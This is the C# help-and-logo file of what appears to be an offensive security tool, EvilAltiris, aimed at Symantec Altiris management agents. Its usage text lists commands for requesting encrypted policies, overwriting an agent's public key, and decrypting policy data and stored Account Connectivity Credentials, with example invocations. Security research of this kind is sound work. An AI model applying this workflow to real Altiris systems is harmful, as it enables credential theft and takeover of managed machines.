using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace EvilAltiris.Lib.CmdLine
{
    public class Info
    {
        public static void ShowLogo()
        {
            string logo = @"
█▀▀ █ █ █ █   ▄▀█ █   ▀█▀ █ █▀█ █ █▀
██▄ ▀▄▀ █ █▄▄ █▀█ █▄▄  █  █ █▀▄ █ ▄█                                                                                               ";
            Console.WriteLine(logo);
            Console.WriteLine("\nAuthor: Matt Johnson - MDSec ActiveBreach - v0.0.1\r\n");
        }

        public static void ShowUsage()
        {
            Console.WriteLine("Usage: EvilAltiris <command> <args>");

            Console.WriteLine("\nSMATool Commands (requires elevation and SMATool.exe on disk):\n");
            Console.WriteLine("SmaGetPublicKey\t\t-\tReturn the current public key value for the agent from the LDB");
            Console.WriteLine("SmaGetTypeGuid\t\t-\tFetch the type GUID from a machine joined to Altiris (requires elevation and SMATool.exe on disk)");
            Console.WriteLine("SmaDecrypt\t\t-\tDecrypt encrypted policy data or ACC (requires elevation and SMATool.exe on disk)");

            Console.WriteLine("\nGeneric Commands (no elevation or SMATool.exe required):\n"); 
            Console.WriteLine("GetClientPolicies\t-\tRequest encrypted policies from Altiris server");
            Console.WriteLine("GetMachineGuid\t\t-\tRead the current machineGuid value from the registry");
            Console.WriteLine("GenerateKeys\t\t-\tGenerate a new public / private key pair and policyKey blob");
            Console.WriteLine("SetPublicKey\t\t-\tOverwrite the public key (policyKey) value for an existing machineGuid");
            Console.WriteLine("DecryptPolicy\t\t-\tDecrypt encrypted policy data with private key XML");
            Console.WriteLine("DecryptAcc\t\t-\tDecrypt an encrypted Account Connectivity Credential (ACC) blob");
            Console.WriteLine("RestoreAgent\t\t-\tForce the agent to make a request to CreateResource.aspx to restore the existing agent public key");

            Console.WriteLine("\nArguments:\n");
            Console.WriteLine("/smapath\t-\tPath to SMATool.exe on disk for any SMATool commands");
            Console.WriteLine("/url\t\t-\tNotification Server target including the protocol e.g http://server.local");
            Console.WriteLine("/key\t\t-\tXML string representing a private key for decryption or policyKey value");
            Console.WriteLine("/data\t\t-\tData to decrypt, can be either a file on disk containing binary data or a base64 string");
            Console.WriteLine("/machine\t-\tMachine Guid for the agent");
            Console.WriteLine("/type\t\t-\tType Guid for the agent");
            Console.WriteLine("/outfile\t-\t(Optional) outfile for the returned data");

            Console.WriteLine("\nExample usage:\n");
            Console.WriteLine("EvilAltiris.exe SmaGetPublicKey /smatool:C:\\tools\\smatool.exe");
            Console.WriteLine("EvilAltiris.exe SmaGetTypeGuid /smatool:C:\\tools\\smatool.exe");
            Console.WriteLine("EvilAltiris.exe SmaDecrypt /smatool:C:\\tools\\smatool.exe /data:AAA4xIqgq7WOIYvNqAXSaxh\n");

            Console.WriteLine("EvilAltiris.exe GetClientPolicies /url:http://altiris.local /machine:{C07989E4-5473-4856-9752-8907FFCC506A} /type:{493435F7-3B17-4C4C-B07F-C23E7AB7781F}");
            Console.WriteLine("EvilAltiris.exe GetMachineGuid");
            Console.WriteLine("EvilAltiris.exe GenerateKeys");
            Console.WriteLine("EvilAltiris.exe SetPublicKey /key:AAA4xIqgq7WOIYvNqAXSaxh /url:http://altiris.local /machine:{C07989E4-5473-4856-9752-8907FFCC506A}");
            Console.WriteLine("EvilAltiris.exe DecryptPolicy /key:<RSAKeyValue><Modulus>3F7JlI</D></RSAKeyValue> /data:encrypted_policy.dat");
            Console.WriteLine("EvilAltiris.exe DecryptAcc /data:AAA4xIqgq7WOIYvNqAXSaxh");
            Console.WriteLine("EvilAltiris.exe RestoreAgent");
        }
    }
}